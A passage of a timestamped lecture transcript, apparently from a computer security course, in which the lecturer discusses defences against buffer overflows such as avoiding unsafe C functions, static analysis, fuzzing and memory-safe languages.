stuff, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>9:30</time_slice>
              <text_slice>using special types of
[INAUDIBLE] protections</text_slice>
            </slice>
            <slice>
              <time_slice>9:31</time_slice>
              <text_slice>and things like that, that we'll
discuss a little bit later.</text_slice>
            </slice>
            <slice>
              <time_slice>9:35</time_slice>
              <text_slice>That's basically
an overview of what</text_slice>
            </slice>
            <slice>
              <time_slice>9:37</time_slice>
              <text_slice>the buffer overflow looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>9:39</time_slice>
              <text_slice>So, how are we gonna
fix these things?</text_slice>
            </slice>
            <slice>
              <time_slice>9:41</time_slice>
              <text_slice>So, one fix for
avoiding buffer overflow</text_slice>
            </slice>
            <slice>
              <time_slice>9:49</time_slice>
              <text_slice>is to simply avoid
bugs in your C code.</text_slice>
            </slice>
            <slice>
              <time_slice>9:59</time_slice>
              <text_slice>This has the nice advantage of
being correct by construction,</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>If you don't have any
bugs in your program,</text_slice>
            </slice>
            <slice>
              <time_slice>10:04</time_slice>
              <text_slice>ipso facto the attacker cannot
take advantage of any bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>10:06</time_slice>
              <text_slice>That's on the
professor, I get paid</text_slice>
            </slice>
            <slice>
              <time_slice>10:08</time_slice>
              <text_slice>to think about something
deeply like that.</text_slice>
            </slice>
            <slice>
              <time_slice>10:10</time_slice>
              <text_slice>Now, this of course, is
easier said than done.</text_slice>
            </slice>
            <slice>
              <time_slice>10:13</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:13</time_slice>
              <text_slice>There's a couple of very
straightforward things</text_slice>
            </slice>
            <slice>
              <time_slice>10:15</time_slice>
              <text_slice>that programmers can do to
practice good security hygiene.</text_slice>
            </slice>
            <slice>
              <time_slice>10:17</time_slice>
              <text_slice>So, for example, functions
like this gets function, right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:21</time_slice>
              <text_slice>These are kind of
like go-tos, these</text_slice>
            </slice>
            <slice>
              <time_slice>10:22</time_slice>
              <text_slice>are now known to be bad ideas.</text_slice>
            </slice>
            <slice>
              <time_slice>10:24</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:24</time_slice>
              <text_slice>So, when you compile your
code, and you include functions</text_slice>
            </slice>
            <slice>
              <time_slice>10:27</time_slice>
              <text_slice>like this-- if you're using
a modern compiler, GCC,</text_slice>
            </slice>
            <slice>
              <time_slice>10:30</time_slice>
              <text_slice>Visual Studio, whatever, it will
actually complain about that.</text_slice>
            </slice>
            <slice>
              <time_slice>10:33</time_slice>
              <text_slice>It'll say, hey, you're one
of these unsafe functions.</text_slice>
            </slice>
            <slice>
              <time_slice>10:35</time_slice>
              <text_slice>Consider using
[? FGADS ?], or using</text_slice>
            </slice>
            <slice>
              <time_slice>10:37</time_slice>
              <text_slice>a version of [INAUDIBLE]
that actually</text_slice>
            </slice>
            <slice>
              <time_slice>10:39</time_slice>
              <text_slice>can track the bounds of things.</text_slice>
            </slice>
            <slice>
              <time_slice>10:41</time_slice>
              <text_slice>So, that's one simple thing
that programmers can do.</text_slice>
            </slice>
            <slice>
              <time_slice>10:43</time_slice>
              <text_slice>But note that a
lot of applications</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>actually manipulate
buffers without necessarily</text_slice>
            </slice>
            <slice>
              <time_slice>10:48</time_slice>
              <text_slice>calling one of these functions.</text_slice>
            </slice>
            <slice>
              <time_slice>10:49</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:50</time_slice>
              <text_slice>This is very common in network
servers, things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>10:52</time_slice>
              <text_slice>They'll define their own
custom parsing routines,</text_slice>
            </slice>
            <slice>
              <time_slice>10:54</time_slice>
              <text_slice>then make sure that
things are extracted</text_slice>
            </slice>
            <slice>
              <time_slice>10:55</time_slice>
              <text_slice>from the buffers in
the way that they want.</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>So, just restricting yourself
to these types of things</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>won't solve the
problem completely.</text_slice>
            </slice>
            <slice>
              <time_slice>11:03</time_slice>
              <text_slice>So, another thing that makes
this approach difficult</text_slice>
            </slice>
            <slice>
              <time_slice>11:07</time_slice>
              <text_slice>is that it's not always obvious
what is a bug in a C program.</text_slice>
            </slice>
            <slice>
              <time_slice>11:12</time_slice>
              <text_slice>So, if you've ever worked on a
very large scale system that's</text_slice>
            </slice>
            <slice>
              <time_slice>11:14</time_slice>
              <text_slice>been written in C, you'll
know that it can be tricky</text_slice>
            </slice>
            <slice>
              <time_slice>11:17</time_slice>
              <text_slice>if you've got some function
definition that takes then</text_slice>
            </slice>
            <slice>
              <time_slice>11:20</time_slice>
              <text_slice>18 void star pointers.</text_slice>
            </slice>
            <slice>
              <time_slice>11:22</time_slice>
              <text_slice>I mean, only Zeus knows what
all those things mean, right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:24</time_slice>
              <text_slice>And so it's much more
difficult in a language like C,</text_slice>
            </slice>
            <slice>
              <time_slice>11:27</time_slice>
              <text_slice>that has weak typing
and things like that,</text_slice>
            </slice>
            <slice>
              <time_slice>11:30</time_slice>
              <text_slice>to actually understand
as a programmer</text_slice>
            </slice>
            <slice>
              <time_slice>11:31</time_slice>
              <text_slice>what it means to
have a bug, and what</text_slice>
            </slice>
            <slice>
              <time_slice>11:33</time_slice>
              <text_slice>it means to not have a bug.</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>OK?</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>So, in general, one
of the main themes</text_slice>
            </slice>
            <slice>
              <time_slice>11:36</time_slice>
              <text_slice>that you'll see in this
class is that C is probably</text_slice>
            </slice>
            <slice>
              <time_slice>11:39</time_slice>
              <text_slice>the spawn of the devil, right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:42</time_slice>
              <text_slice>And we use it
because, once again,</text_slice>
            </slice>
            <slice>
              <time_slice>11:44</time_slice>
              <text_slice>we typically want to
be to be fast, right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>But as hardware gets
faster and as we</text_slice>
            </slice>
            <slice>
              <time_slice>11:48</time_slice>
              <text_slice>get more and better languages to
write large-scale systems code,</text_slice>
            </slice>
            <slice>
              <time_slice>11:51</time_slice>
              <text_slice>we'll see that maybe
it doesn't always</text_slice>
            </slice>
            <slice>
              <time_slice>11:54</time_slice>
              <text_slice>make sense to write
your stuff in C. Even</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>if you think it has to be fast.</text_slice>
            </slice>
            <slice>
              <time_slice>11:58</time_slice>
              <text_slice>So, we'll discuss some of
that later and later lectures.</text_slice>
            </slice>
            <slice>
              <time_slice>12:01</time_slice>
              <text_slice>So, that's one
approach, avoiding bugs</text_slice>
            </slice>
            <slice>
              <time_slice>12:03</time_slice>
              <text_slice>in the first place.</text_slice>
            </slice>
            <slice>
              <time_slice>12:04</time_slice>
              <text_slice>So, another approach--
is to build tools that</text_slice>
            </slice>
            <slice>
              <time_slice>12:15</time_slice>
              <text_slice>allow programmers to find bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>12:26</time_slice>
              <text_slice>And so an example
of this is something</text_slice>
            </slice>
            <slice>
              <time_slice>12:29</time_slice>
              <text_slice>that's called static analysis.</text_slice>
            </slice>
            <slice>
              <time_slice>12:30</time_slice>
              <text_slice>Now we'll talk a little bit
more about static analysis</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>in later lectures,
but suffice it</text_slice>
            </slice>
            <slice>
              <time_slice>12:34</time_slice>
              <text_slice>to say that static analysis is
a way of analyzing the source</text_slice>
            </slice>
            <slice>
              <time_slice>12:38</time_slice>
              <text_slice>code of your program
before it even runs</text_slice>
            </slice>
            <slice>
              <time_slice>12:40</time_slice>
              <text_slice>and looking for
potential problems.</text_slice>
            </slice>
            <slice>
              <time_slice>12:42</time_slice>
              <text_slice>So, imagine that you have
a function like this.</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>So, the [INAUDIBLE]
foo function,</text_slice>
            </slice>
            <slice>
              <time_slice>12:50</time_slice>
              <text_slice>it takes in a pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>12:56</time_slice>
              <text_slice>Let's say it declares
an integer offset value.</text_slice>
            </slice>
            <slice>
              <time_slice>13:02</time_slice>
              <text_slice>It declares another
pointer and adds the offset</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>to that pointer.</text_slice>
            </slice>
            <slice>
              <time_slice>13:11</time_slice>
              <text_slice>Now, even just at this
moment in the code,</text_slice>
            </slice>
            <slice>
              <time_slice>13:13</time_slice>
              <text_slice>right, static
analysis can tell you</text_slice>
            </slice>
            <slice>
              <time_slice>13:15</time_slice>
              <text_slice>that this offset variable
is un-initialized.</text_slice>
            </slice>
            <slice>
              <time_slice>13:18</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>13:18</time_slice>
              <text_slice>So, essentially you can
do things like saying,</text_slice>
            </slice>
            <slice>
              <time_slice>13:20</time_slice>
              <text_slice>is there any way,
is there any control</text_slice>
            </slice>
            <slice>
              <time_slice>13:22</time_slice>
              <text_slice>floating through this program
by which offset could have been</text_slice>
            </slice>
            <slice>
              <time_slice>13:26</time_slice>
              <text_slice>initialized before
it was actually used</text_slice>
            </slice>
            <slice>
              <time_slice>13:28</time_slice>
              <text_slice>this in this calculation here.</text_slice>
            </slice>
            <slice>
              <time_slice>13:29</time_slice>
              <text_slice>Now, in this example it is very
simple to see the answer is no.</text_slice>
            </slice>
            <slice>
              <time_slice>13:32</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>13:32</time_slice>
              <text_slice>You can imagine that if there
were more branches, or things</text_slice>
            </slice>
            <slice>
              <time_slice>13:34</time_slice>
              <text_slice>like this, it would be
more difficult to tell.</text_slice>
            </slice>
            <slice>
              <time_slice>13:36</time_slice>
              <text_slice>But one thing that a static
analysis tool can tell you,</text_slice>
            </slice>
            <slice>
              <time_slice>13:39</time_slice>
              <text_slice>and in fact, one thing that
[? popular ?] compilers will</text_slice>
            </slice>
            <slice>
              <time_slice>13:41</time_slice>
              <text_slice>tell you, is you'll compile
this, and it'll say, hey buddy,</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>this has not been initialized.</text_slice>
            </slice>
            <slice>
              <time_slice>13:45</time_slice>
              <text_slice>Are you sure, is this
what you want to do?</text_slice>
            </slice>
            <slice>
              <time_slice>13:46</time_slice>
              <text_slice>So, that's one very simple
example of static analysis.</text_slice>
            </slice>
            <slice>
              <time_slice>13:49</time_slice>
              <text_slice>Another example of what you can
do is, let's say after this,</text_slice>
            </slice>
            <slice>
              <time_slice>13:53</time_slice>
              <text_slice>we have a branch condition here.</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>So, you say, if the offset
is greater than eight, then</text_slice>
            </slice>
            <slice>
              <time_slice>14:06</time_slice>
              <text_slice>we'll call some function
bar, and passing the offset.</text_slice>
            </slice>
            <slice>
              <time_slice>14:12</time_slice>
              <text_slice>Now, one thing you
can note about this</text_slice>
            </slice>
            <slice>
              <time_slice>14:14</time_slice>
              <text_slice>is that this branch condition
here actually tells us</text_slice>
            </slice>
            <slice>
              <time_slice>14:17</time_slice>
              <text_slice>something about what
the value of offset is.</text_slice>
            </slice>
            <slice>
              <time_slice>14:20</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>14:20</time_slice>
              <text_slice>Ignoring the fact that
it wasn't initialized ,</text_slice>
            </slice>
            <slice>
              <time_slice>14:22</time_slice>
              <text_slice>we do know that
once we get here,</text_slice>
            </slice>
            <slice>
              <time_slice>14:24</time_slice>
              <text_slice>we know the offset actually
has to be greater than eight.</text_slice>
            </slice>
            <slice>
              <time_slice>14:26</time_slice>
              <text_slice>So, in some cases,
what we can do</text_slice>
            </slice>
            <slice>
              <time_slice>14:28</time_slice>
              <text_slice>is actually propagate that
constraint, that notion</text_slice>
            </slice>
            <slice>
              <time_slice>14:31</time_slice>
              <text_slice>that the offset must
be greater than eight,</text_slice>
            </slice>
            <slice>
              <time_slice>14:33</time_slice>
              <text_slice>into our analysis of bar.</text_slice>
            </slice>
            <slice>
              <time_slice>14:35</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>14:35</time_slice>
              <text_slice>So, when we start
statically analyzing bar,</text_slice>
            </slice>
            <slice>
              <time_slice>14:37</time_slice>
              <text_slice>we know that offset can
only take certain values.</text_slice>
            </slice>
            <slice>
              <time_slice>14:40</time_slice>
              <text_slice>So, once again, this is a
very high-level introduction</text_slice>
            </slice>
            <slice>
              <time_slice>14:42</time_slice>
              <text_slice>to static analysis,
and we'll discuss</text_slice>
            </slice>
            <slice>
              <time_slice>14:44</time_slice>
              <text_slice>it more in later lectures.</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>But this is a basic
intuition of how</text_slice>
            </slice>
            <slice>
              <time_slice>14:46</time_slice>
              <text_slice>we might be able to
detect some types of bugs</text_slice>
            </slice>
            <slice>
              <time_slice>14:49</time_slice>
              <text_slice>without even
executing your code.</text_slice>
            </slice>
            <slice>
              <time_slice>14:51</time_slice>
              <text_slice>So, does that all makes sense?</text_slice>
            </slice>
            <slice>
              <time_slice>14:55</time_slice>
              <text_slice>So, another thing you
can think about doing too</text_slice>
            </slice>
            <slice>
              <time_slice>14:57</time_slice>
              <text_slice>is what they call
program fuzzing.</text_slice>
            </slice>
            <slice>
              <time_slice>15:02</time_slice>
              <text_slice>So, the idea behind
program fuzzing</text_slice>
            </slice>
            <slice>
              <time_slice>15:04</time_slice>
              <text_slice>is that essentially you take all
of the functions in your code,</text_slice>
            </slice>
            <slice>
              <time_slice>15:07</time_slice>
              <text_slice>and then essentially throw
random values for input</text_slice>
            </slice>
            <slice>
              <time_slice>15:10</time_slice>
              <text_slice>to those functions.</text_slice>
            </slice>
            <slice>
              <time_slice>15:12</time_slice>
              <text_slice>And so the idea is that
you want to have high code</text_slice>
            </slice>
            <slice>
              <time_slice>15:15</time_slice>
              <text_slice>coverage for all of your tests.</text_slice>
            </slice>
            <slice>
              <time_slice>15:17</time_slice>
              <text_slice>So, if you go out
in the real world,</text_slice>
            </slice>
            <slice>
              <time_slice>15:19</time_slice>
              <text_slice>typically when you
check in unit test,</text_slice>
            </slice>
            <slice>
              <time_slice>15:21</time_slice>
              <text_slice>you can't just do things like,
I tried values two, four, eight,</text_slice>
            </slice>
            <slice>
              <time_slice>15:24</time_slice>
              <text_slice>and 15, because 15
is an odd number,</text_slice>
            </slice>
            <slice>
              <time_slice>15:26</time_slice>
              <text_slice>so I probably tested
all the branches right.</text_slice>
            </slice>
            <slice>
              <time_slice>15:28</time_slice>
              <text_slice>What you actually
have to do is you</text_slice>
            </slice>
            <slice>
              <time_slice>15:29</time_slice>
              <text_slice>have to look at things like,
like I said how many branches</text_slice>
            </slice>
            <slice>
              <time_slice>15:31</time_slice>
              <text_slice>in the program overall were
actually touched by your test</text_slice>
            </slice>
            <slice>
              <time_slice>15:35</time_slice>
              <text_slice>code, right?</text_slice>
            </slice>
            <slice>
              <time_slice>15:36</time_slice>
              <text_slice>Because that's typically
where the bugs hide.</text_slice>
            </slice>
            <slice>
              <time_slice>15:38</time_slice>
              <text_slice>The programmers don't think
about the corner cases,</text_slice>
            </slice>
            <slice>
              <time_slice>15:39</time_slice>
              <text_slice>and so as a result, they do
have some unit tests that pass.</text_slice>
            </slice>
            <slice>
              <time_slice>15:42</time_slice>
              <text_slice>They even have bigger
tests that pass.</text_slice>
            </slice>
            <slice>
              <time_slice>15:44</time_slice>
              <text_slice>But they're not actually
pinning all the corner</text_slice>
            </slice>
            <slice>
              <time_slice>15:46</time_slice>
              <text_slice>cases in the program.</text_slice>
            </slice>
            <slice>
              <time_slice>15:47</time_slice>
              <text_slice>So, static analysis can actually
help with this fuzzing here.</text_slice>
            </slice>
            <slice>
              <time_slice>15:50</time_slice>
              <text_slice>Once again, using things like
this notion of constraint.</text_slice>
            </slice>
            <slice>
              <time_slice>15:52</time_slice>
              <text_slice>So, for example, in
this program here, we</text_slice>
            </slice>
            <slice>
              <time_slice>15:55</time_slice>
              <text_slice>have this branch condition
here that specified the offset</text_slice>
            </slice>
            <slice>
              <time_slice>15:58</time_slice>
              <text_slice>being greater than eight.</text_slice>
            </slice>
            <slice>
              <time_slice>15:59</time_slice>
              <text_slice>So, we can know what that
offset is statically.</text_slice>
            </slice>
            <slice>
              <time_slice>16:01</time_slice>
              <text_slice>So, we can make sure that if
we're automatically generating</text_slice>
            </slice>
            <slice>
              <time_slice>16:03</time_slice>
              <text_slice>fuzzed inputs, we can ensure
that one of those inputs</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>hopefully will ensure
that, somehow, offset is</text_slice>
            </slice>
            <slice>
              <time_slice>16:10</time_slice>
              <text_slice>less than eight, one will ensure
that offset's equal to eight,</text_slice>
            </slice>
            <slice>
              <time_slice>16:12</time_slice>
              <text_slice>one will ensure that
it's greater than eight.</text_slice>
            </slice>
            <slice>
              <time_slice>16:15</time_slice>
              <text_slice>So, does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>16:18</time_slice>
              <text_slice>Cool.</text_slice>
            </slice>
            <slice>
              <time_slice>16:19</time_slice>
              <text_slice>So, that's the basic idea behind
the notion of building tools</text_slice>
            </slice>
            <slice>
              <time_slice>16:22</time_slice>
              <text_slice>to help programmers find bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>16:24</time_slice>
              <text_slice>So, the nice thing is that
even partial analysis can</text_slice>
            </slice>
            <slice>
              <time_slice>16:29</time_slice>
              <text_slice>be very, very useful,
particularly when</text_slice>
            </slice>
            <slice>
              <time_slice>16:31</time_slice>
              <text_slice>you're dealing with C.
A lot of these tools</text_slice>
            </slice>
            <slice>
              <time_slice>16:32</time_slice>
              <text_slice>that we'll discuss, to prevent
against things like buffer</text_slice>
            </slice>
            <slice>
              <time_slice>16:35</time_slice>
              <text_slice>overflow or
initialized variables,</text_slice>
            </slice>
            <slice>
              <time_slice>16:37</time_slice>
              <text_slice>they can't catch
all the problems.</text_slice>
            </slice>
            <slice>
              <time_slice>16:38</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>16:39</time_slice>
              <text_slice>But they can actually give us
forward progress towards making</text_slice>
            </slice>
            <slice>
              <time_slice>16:42</time_slice>
              <text_slice>these programs more secure.</text_slice>
            </slice>
            <slice>
              <time_slice>16:44</time_slice>
              <text_slice>Now, of course, the
disadvantage of these things</text_slice>
            </slice>
            <slice>
              <time_slice>16:46</time_slice>
              <text_slice>is that they're not complete.</text_slice>
            </slice>
            <slice>
              <time_slice>16:48</time_slice>
              <text_slice>Forward progress is
not complete progress.</text_slice>
            </slice>
            <slice>
              <time_slice>16:50</time_slice>
              <text_slice>And so it's still
a very active area</text_slice>
            </slice>
            <slice>
              <time_slice>16:52</time_slice>
              <text_slice>of research of how you defend
against security exploits in C</text_slice>
            </slice>
            <slice>
              <time_slice>16:56</time_slice>
              <text_slice>and just in programs in general.</text_slice>
            </slice>
            <slice>
              <time_slice>17:00</time_slice>
              <text_slice>So, those were two approaches
to deal with defending</text_slice>
            </slice>
            <slice>
              <time_slice>17:03</time_slice>
              <text_slice>against buffer overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>17:05</time_slice>
              <text_slice>There's actually some
other approaches.</text_slice>
            </slice>
            <slice>
              <time_slice>17:07</time_slice>
              <text_slice>So, a third approach you
might think about using</text_slice>
            </slice>
            <slice>
              <time_slice>17:13</time_slice>
              <text_slice>is the use [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>17:21</time_slice>
              <text_slice>And so examples of these are
things like Python, Java, C#--</text_slice>
            </slice>
            <slice>
              <time_slice>17:36</time_slice>
              <text_slice>I'm not going to put up Pearl
there because people who use</text_slice>
            </slice>
            <slice>
              <time_slice>17:38</time_slice>
              <text_slice>Pearl are bad people.</text_slice>
            </slice>
            <slice>
              <time_slice>17:39</time_slice>
              <text_slice>So you can use a memory-safe
language like that.</text_slice>
            </slice>
            <slice>
              <time_slice>17:43</time_slice>
              <text_slice>And this is to a certain extent
seems like the most obvious</text_slice>
            </slice>
            <slice>
              <time_slice>17:46</time_slice>
              <text_slice>thing that you could do.</text_slice>
            </slice>
            <slice>
              <time_slice>17:48</time_slice>
              <text_slice>I just told you over
there that basically C</text_slice>
            </slice>
            <slice>
              <time_slice>17:51</time_slice>
              <text_slice>is high-level assembly code,
and it exposes raw pointers</text_slice>
            </slice>
            <slice>
              <time_slice>17:54</time_slice>
              <text_slice>and does all these things
that you don't want it to do,</text_slice>
            </slice>
            <slice>
              <time_slice>17:56</time_slice>
              <text_slice>and it doesn't do
things you do want</text_slice>
            </slice>
            <slice>
              <time_slice>17:57</time_slice>
              <text_slice>it to do, like [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>17:58</time_slice>
              <text_slice>So, why not just use one of
these high level languages?</text_slice>
            </slice>
            <slice>
              <time_slice>18:01</time_slice>
              <text_slice>Well, there's a couple
reasons for that.</text_slice>
            </slice>
            <slice>
              <time_slice>18:03</time_slice>
              <text_slice>So, first of all, there's
actually a lot of legacy code</text_slice>
            </slice>
            <slice>
              <time_slice>18:09</time_slice>
              <text_slice>that's out there.</text_slice>
            </slice>
            <slice>
              <time_slice>18:14</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>18:15</time_slice>
              <text_slice>So, it's all fine and dandy
if you want go out and start</text_slice>
            </slice>
            <slice>
              <time_slice>18:17</time_slice>
              <text_slice>your new project and
you want to write it</text_slice>
            </slice>
            <slice>
              <time_slice>18:18</time_slice>
              <text_slice>in one of these
really safe languages.</text_slice>
            </slice>
            <slice>
              <time_slice>18:20</time_slice>
              <text_slice>But what if you've been
given this big binary</text_slice>
            </slice>
            <slice>
              <time_slice>18:22</time_slice>
              <text_slice>or this big source code
distribution that's</text_slice>
            </slice>
            <slice>
              <time_slice>18:24</time_slice>
              <text_slice>been written in C, it's been
maintained for 10, 15 years,</text_slice>
            </slice>
            <slice>
              <time_slice>18:27</time_slice>
              <text_slice>it's been this
generational project,</text_slice>
            </slice>
            <slice>
              <time_slice>18:28</time_slice>
              <text_slice>I mean our children's children
will be working on it.</text_slice>
            </slice>
            <slice>
              <time_slice>18:31</time_slice>
              <text_slice>You can't just say, I'm just
going to write everything in C#</text_slice>
            </slice>
            <slice>
              <time_slice>18:33</time_slice>
              <text_slice>and change the world.</text_slice>
            </slice>
            <slice>
              <time_slice>18:34</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>18:34</time_slice>
              <text_slice>And this isn't just a
problem in C, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>There's actually
systems that you</text_slice>
            </slice>
            <slice>
              <time_slice>18:38</time_slice>
              <text_slice>use that you should be
afraid, because they actually</text_slice>
            </slice>
            <slice>
              <time_slice>18:41</time_slice>
              <text_slice>use Fortran and COBOL code.</text_slice>
            </slice>
            <slice>
              <time_slice>18:43</time_slice>
              <text_slice>What?</text_slice>
            </slice>
            <slice>
              <time_slice>18:44</time_slice>
              <text_slice>That's stuff from the Civil War.</text_slice>
            </slice>
            <slice>
              <time_slice>18:46</time_slice>
              <text_slice>So, why does that happen?</text_slice>
            </slice>
            <slice>
              <time_slice>18:48</time_slice>
              <text_slice>Once again, the
reason why it happens</text_slice>
            </slice>
            <slice>
              <time_slice>18:49</time_slice>
              <text_slice>is because as engineers,
we kind of want to think,</text_slice>
            </slice>
            <slice>
              <time_slice>18:52</time_slice>
              <text_slice>oh, we can just build everything
ourselves, it'll be awesome,</text_slice>
            </slice>
            <slice>
              <time_slice>18:54</time_slice>
              <text_slice>it'll be just the
way that I want it,</text_slice>
            </slice>
            <slice>
              <time_slice>18:55</time_slice>
              <text_slice>I'll call my variables
the things that I want.</text_slice>
            </slice>
            <slice>
              <time_slice>18:57</time_slice>
              <text_slice>When in world, that
doesn't happen.</text_slice>
            </slice>
            <slice>
              <time_slice>18:59</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>18:59</time_slice>
              <text_slice>You show up on your job, and
you have this thing that exists,</text_slice>
            </slice>
            <slice>
              <time_slice>19:02</time_slice>
              <text_slice>and you look at the code
base, and you say, well,</text_slice>
            </slice>
            <slice>
              <time_slice>19:04</time_slice>
              <text_slice>why doesn't it do this?</text_slice>
            </slice>
            <slice>
              <time_slice>19:05</time_slice>
              <text_slice>And then you say, listen.</text_slice>
            </slice>
            <slice>
              <time_slice>19:07</time_slice>
              <text_slice>We'll deal with that in V2.</text_slice>
            </slice>
            <slice>
              <time_slice>19:08</time_slice>
              <text_slice>But for now, you
got to make things</text_slice>
            </slice>
            <slice>
              <time_slice>19:10</time_slice>
              <text_slice>work because the customers
are taking away their money.</text_slice>
            </slice>
            <slice>
              <time_slice>19:13</time_slice>
              <text_slice>So, there's basically this
huge issue of legacy code here,</text_slice>
            </slice>
            <slice>
              <time_slice>19:15</time_slice>
              <text_slice>and how do we deal with it?</text_slice>
            </slice>
            <slice>
              <time_slice>19:17</time_slice>
              <text_slice>And as you'll see the with
the baggy bounds system,</text_slice>
            </slice>
            <slice>
              <time_slice>19:20</time_slice>
              <text_slice>One of the advantages of
it is that it actually</text_slice>
            </slice>
            <slice>
              <time_slice>19:22</time_slice>
              <text_slice>inter-operates quite well
with this legacy code.</text_slice>
            </slice>
            <slice>
              <time_slice>19:25</time_slice>
              <text_slice>So, anyway, this is one
reason why you can't just</text_slice>
            </slice>
            <slice>
              <time_slice>19:27</time_slice>
              <text_slice>necessarily make all these
buffer overflow problems go</text_slice>
            </slice>
            <slice>
              <time_slice>19:29</time_slice>
              <text_slice>away by using one of these
memory-safe languages.</text_slice>
            </slice>
            <slice>
              <time_slice>19:33</time_slice>
              <text_slice>So, another challenges
is that what if you need</text_slice>
            </slice>
            <slice>
              <time_slice>19:39</time_slice>
              <text_slice>low-level access to hardware?</text_slice>
            </slice>
            <slice>
              <time_slice>19:48</time_slice>
              <text_slice>This might happen if you're
writing something like a device</text_slice>
            </slice>
            <slice>
              <time_slice>19:51</time_slice>
              <text_slice>driver or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>19:53</time_slice>
              <text_slice>So, in that case,
you really do need</text_slice>
            </slice>
            <slice>
              <time_slice>19:56</time_slice>
              <text_slice>that the benefits
that C gives you</text_slice>
            </slice>
            <slice>
              <time_slice>19:58</time_slice>
              <text_slice>in terms of being
able to look at</text_slice>
            </slice>
            <slice>
              <time_slice>19:59</time_slice>
              <text_slice>registers and
actually understand</text_slice>
            </slice>
            <slice>
              <time_slice>20:01</time_slice>
              <text_slice>a little of [INAUDIBLE]
and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>20:04</time_slice>
              <text_slice>There's another thing too,
which people always bring up</text_slice>
            </slice>
            <slice>
              <time_slice>20:07</time_slice>
              <text_slice>and which I've alluded to
before, but it's performance.</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>Right?</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>So, if you care
about performance,</text_slice>
            </slice>
            <slice>
              <time_slice>20:14</time_slice>
              <text_slice>typically the thing
that you're told</text_slice>
            </slice>
            <slice>
              <time_slice>20:16</time_slice>
              <text_slice>is you've got to
write in C, otherwise</text_slice>
            </slice>
            <slice>
              <time_slice>20:17</time_slice>
              <text_slice>you're just going to
be so slow, you're</text_slice>
            </slice>
            <slice>
              <time_slice>20:19</time_slice>
              <text_slice>going to get laughed out of
code academy or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>20:21</time_slice>
              <text_slice>Now, this is increasingly
less of an issue.</text_slice>
            </slice>
            <slice>
              <time_slice>20:24</time_slice>
              <text_slice>Like the perf stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>Because people have
actually gotten very good</text_slice>
            </slice>
            <slice>
              <time_slice>20:28</time_slice>
              <text_slice>with doing things like
making better compilers</text_slice>
            </slice>
            <slice>
              <time_slice>20:30</time_slice>
              <text_slice>that have all kinds of
powerful optimizations.</text_slice>
            </slice>
            <slice>
              <time_slice>20:32</time_slice>
              <text_slice>And also, there are
these things called</text_slice>
            </slice>
            <slice>
              <time_slice>20:34</time_slice>
              <text_slice>Gits which actually
really reduce</text_slice>
            </slice>
            <slice>
              <time_slice>20:36</time_slice>
              <text_slice>the cost of using these
memory-safe languages.</text_slice>
            </slice>
            <slice>
              <time_slice>20:38</time_slice>
              <text_slice>So, have you guys
heard of Gits before?</text_slice>
            </slice>
            <slice>
              <time_slice>20:41</time_slice>
              <text_slice>So, I'll give you a very brief
introduction to what it is.</text_slice>
            </slice>
            <slice>
              <time_slice>20:43</time_slice>
              <text_slice>The idea is that, think
about a language like Java,</text_slice>
            </slice>
            <slice>
              <time_slice>20:46</time_slice>
              <text_slice>or JavaScript.</text_slice>
